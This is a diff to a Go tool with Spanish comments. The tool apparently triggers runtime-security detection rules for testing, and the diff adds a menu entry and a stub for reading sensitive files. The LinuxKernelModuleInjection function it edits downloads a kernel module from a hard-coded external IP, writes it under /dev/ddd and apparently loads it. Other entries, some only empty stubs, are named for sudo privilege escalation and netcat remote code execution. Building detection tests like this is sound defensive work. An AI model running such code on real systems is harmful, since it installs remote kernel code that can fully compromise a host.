@@ -69,6 +69,8 @@ func ShowMenu() {
 		SudoPotentialPrivilegeEscalation()
 	case 15:
 		NetcatRemoteCodeExecutionInContainer()
+	case 16:
+		ReadSensitiveFileTrustedAfterActivities()
 	default:
 		fmt.Println("Opción no válida")
 	}
@@ -235,8 +237,8 @@ func LinuxKernelModuleInjection() error {
 	fmt.Println("Ejecutando: Linux Kernel Module Injection")
 
 	url := "http://34.27.180.215/sitio/cust0m_mod.ko"
-	filePath := "/dev/ddd/cust0m.ko"
-	dirPath := filepath.Dir(filePath)
+	dirPath := "/dev/ddd"
+	filePath := filepath.Join(dirPath, "cust0m_mod.ko")
 
 	// Crear el directorio si no existe
 	if _, err := os.Stat(dirPath); os.IsNotExist(err) {
@@ -253,14 +255,14 @@ func LinuxKernelModuleInjection() error {
 	defer response.Body.Close()
 
 	// Crear el archivo en el sistema de archivos
-	outFile, err := os.Create(filePath)
+	file, err := os.Create(filePath)
 	if err != nil {
 		return err
 	}
-	defer outFile.Close()
+	defer file.Close()
 
 	// Copiar el contenido descargado al archivo
-	_, err = io.Copy(outFile, response.Body)
+	_, err = io.Copy(file, response.Body)
 	if err != nil {
 		return err
 	}
@@ -271,6 +273,7 @@ func LinuxKernelModuleInjection() error {
 		return err
 	}
 
+	fmt.Println("Módulo del kernel inyectado con éxito desde", filePath)
 	return nil
 }
 
@@ -522,4 +525,10 @@ func SudoPotentialPrivilegeEscalation() {
 func NetcatRemoteCodeExecutionInContainer() {
 	fmt.Println("Ejecutando: Detect crypto miners using the Stratum protocol")
 	// Lógica para Regla3
+}
+
+// Intentar levantarla
+func ReadSensitiveFileTrustedAfterActivities() {
+	// Lógica para Regla3
+
 }
